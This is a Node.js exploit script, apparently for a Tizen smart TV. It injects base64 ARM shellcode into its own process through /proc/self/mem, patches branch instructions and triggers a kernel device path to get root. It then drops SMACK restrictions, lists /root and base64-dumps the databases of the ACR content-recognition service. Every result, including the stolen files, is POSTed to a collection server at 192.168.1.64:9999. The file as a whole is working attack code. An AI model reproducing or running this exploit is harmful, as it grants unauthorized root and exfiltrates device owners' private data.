var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var TRAMP3_B64 = "BABS4woAALoAwNHlMwBc4wcAABoBwNHlRwBc4wQAABoQQC3pEECf5QAAoOM0/y/hEIC96ATAn+Uc/y/hLAUCALy+IQA=";
var SC3_B64 = "8E8t6QAgoOPAMp/lRNBN4gJAoOEUAI3iAlCg4QIQoOMFcKDjFDCN5a82Q+L2PEPiGDCN5Zgyn+UcMI3lAjCg4QAAAO8A4FDiCgCgsz0AALo0kI3iArCg4QLAoOECMaDjAwSg480VoOM4MI3lajWD4vADzeE8MI3lICCN5SQgjeUAII3lBGAZ5QAwmeUEMI3lBDCd5QMAVuERAAA6CJCJ4gEAW+MMAAAaABCg4w4AoOEBIKDhATCg4QFAoOEBUKDhBnCg4wAAAO8AMJ3lAQBT4QEAoBEUAKADGgAA6gGwoOPn///qBDCd5Q4AoOHkEZ/lICCN4gaAQ+AoYI3lAQZY4wAwoOM2cKDjA0Cg4QGGoCMDUKDhLICN5QAAAO8AoFDiCgAACgQgGeUGAFLhKQAAGg4AoOEDEKDhAyCg4QZwoOMAAADvCwCg40TQjeLwj73oCBCg4Q5AoOEDIKDjATCg48BwoOMAAADvADCg4QEKcOMLAACaBDAZ5QYAU+EVAAAaDgCg4QoQoOEKIKDhCjCg4QpAoOEGcKDjAAAA7wwAoOPo///qKCGg4QggjeUIEJ3lCSCK4gIAUeEIAACKACCg4wgQoOECMKDhAkCg4QJQoOFbcKDjAAAA7wFmhuKr///qACCT5QGgiuIBIELiAQpS4zQAACoEIIPiDCCN5QQgk+WJEwHjAQBS4S4AABoIIIPiDCCN5Qggk+VkAFLjKQAAGgwgk+UBAFLhJgAAGhAgk+VkAFLjIwAAGhQgk+UBAFLhIAAAGhggg+IMII3lGCCT5WQAUuMbAAAaHBCT5Rwgg+IMII3lASCg4YkTAeMBAFLhFAAAGiAgk+VkAFLjEQAAGgTAg+UKIKDjCMCD5QzAg+UQwIPlFMCD5RjAg+UcwIPlIMCD5STAg+UAEODjAhGD5wEgguIUAFLj+v//GgAgneUBIILiACCN5QQwg+K2///qL2RldnN5cwABcwEM";
var SC_ADDR = 0x2052c;
var TRAMP_ADDR = 0x9bed50;
var SITE_A = 0x7aef1c;
var SITE_B = 0x7af2d0;
var ORIG_A = [0xe6, 0xb3, 0xe9, 0xeb];
var ORIG_B = [0xf9, 0xb2, 0xe9, 0xeb];
var HOST = "192.168.1.64";
var PORT = 9999;
var MAGIC = new Buffer([0x33, 0x47, 0x54, 0x53]);

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

function buf4(bytes) {
    var b = new Buffer(4);
    for (var i = 0; i < 4; i++) b[i] = bytes[i];
    return b;
}

function blWord(site, target) {
    var off = (target - (site + 8)) >> 2;
    var w = new Buffer(4);
    w[0] = off & 0xff;
    w[1] = (off >> 8) & 0xff;
    w[2] = (off >> 16) & 0xff;
    w[3] = 0xeb;
    return w;
}

var out = {};
out.started = new Date().toISOString();
out.pid = process.pid;
out.uid_before = process.getuid();

var mem = fs.openSync("/proc/self/mem", "r+");
function readMem(addr, len) { var b = new Buffer(len); fs.readSync(mem, b, 0, len, addr); return b; }
function writeMem(addr, buf) { fs.writeSync(mem, buf, 0, buf.length, addr); }
function eq(a, b) { for (var i = 0; i < b.length; i++) { if (a[i] !== b[i]) return false; } return true; }

function restore() {
    try { writeMem(SITE_A, buf4(ORIG_A)); writeMem(SITE_B, buf4(ORIG_B)); out.restored = true; }
    catch (e) { out.restored = "ERR " + e.message; }
}

try {
    var maps = fs.readFileSync("/proc/self/maps", "utf8");
    out.node_text_ok = maps.indexOf("00010000-009bf000 r-xp 00000000") >= 0;
    out.site_a_bytes = readMem(SITE_A, 4).toString("hex");
    out.site_b_bytes = readMem(SITE_B, 4).toString("hex");
    var gz = readMem(SC_ADDR, 8);
    out.gap_zero = true;
    for (var i = 0; i < gz.length; i++) { if (gz[i] !== 0) { out.gap_zero = false; break; } }
    var tz = readMem(TRAMP_ADDR, 8);
    out.tramp_zero = true;
    for (var i = 0; i < tz.length; i++) { if (tz[i] !== 0) { out.tramp_zero = false; break; } }
    try {
        var nfd = fs.openSync("/dev/ntksys", "r+");
        out.ntksys = "ok fd=" + nfd;
        fs.closeSync(nfd);
    } catch (e) { out.ntksys = "ERR " + e.message; }
    post("/g27_diag", out);

    if (!out.gap_zero) throw new Error("gap not zero: " + out.gap_zero);

    var scBuf = new Buffer(SC3_B64, "base64");
    var trampBuf = new Buffer(TRAMP3_B64, "base64");
    writeMem(SC_ADDR, scBuf);
    out.sc_written = eq(readMem(SC_ADDR, 8), scBuf.slice(0, 8));
    writeMem(TRAMP_ADDR, trampBuf);
    out.tramp_written = eq(readMem(TRAMP_ADDR, 8), trampBuf.slice(0, 8));

    var wa = blWord(SITE_A, TRAMP_ADDR);
    var wb = blWord(SITE_B, TRAMP_ADDR);
    writeMem(SITE_A, wa);
    writeMem(SITE_B, wb);
    out.patched = eq(readMem(SITE_A, 4), wa) && eq(readMem(SITE_B, 4), wb);
    out.bl_words = wa.toString("hex") + "," + wb.toString("hex");
    post("/g27_patched", out);

    var devnull = fs.openSync("/dev/null", "w");
    var t0 = Date.now();
    out.trigger_ret = fs.writeSync(devnull, MAGIC, 0, 4, 0);
    out.scan_ms = Date.now() - t0;

    restore();
    out.site_a_after = readMem(SITE_A, 4).toString("hex");

    out.uid_after = process.getuid();

    if (out.uid_after === 0) {
        try { fs.writeFileSync("/proc/self/attr/current", "*"); out.smack_star = "set"; }
        catch (e) { out.smack_star = "ERR " + e.message; }
        try { out.id = cp.execSync("id 2>&1").toString(); } catch (e) { out.id = "ERR"; }
        try { out.caps = cp.execSync("grep -i cap /proc/self/status 2>&1").toString(); } catch (e) {}
        try {
            out.acr_ls = cp.execSync("ls -laR /opt/usr/home/owner/apps_rw/org.tizen.acr-service-app/ 2>&1 | head -60").toString();
        } catch (e) { out.acr_ls = "ERR " + e.message; }
        try {
            out.root_proof = cp.execSync("ls -la /root/ 2>&1 | head -8; echo ===; ls -la /opt/dbspace/ 2>&1 | grep -i acr | head; echo ===; ls -la /opt/usr/home/owner/apps_rw/org.tizen.acr-service-app/data 2>&1 | head -20").toString();
        } catch (e) { out.root_proof = "ERR"; }
        try {
            out.acr_files = cp.execSync("for f in $(find /opt/usr/home/owner/apps_rw/org.tizen.acr-service-app -type f -name '*.db' 2>/dev/null | head -3); do echo FILE:$f; base64 $f | head -c 4000; echo; done 2>&1").toString();
        } catch (e) { out.acr_files = "ERR"; }
        try {
            out.more = cp.execSync("ls -la /opt/usr/home/owner/data/ 2>&1 | head -10; echo ===; cat /proc/self/status | head -12").toString();
        } catch (e) { out.more = "ERR"; }
    }
    out.success = out.uid_after === 0;
    post("/g27_result", out);
    setTimeout(function () { process.exit(0); }, 2500);
} catch (e) {
    try { restore(); } catch (e2) {}
    out.error = "" + (e && e.stack ? e.stack : e);
    out.uid_after = process.getuid();
    post("/g27_error", out);
    setTimeout(function () { process.exit(2); }, 1500);
}
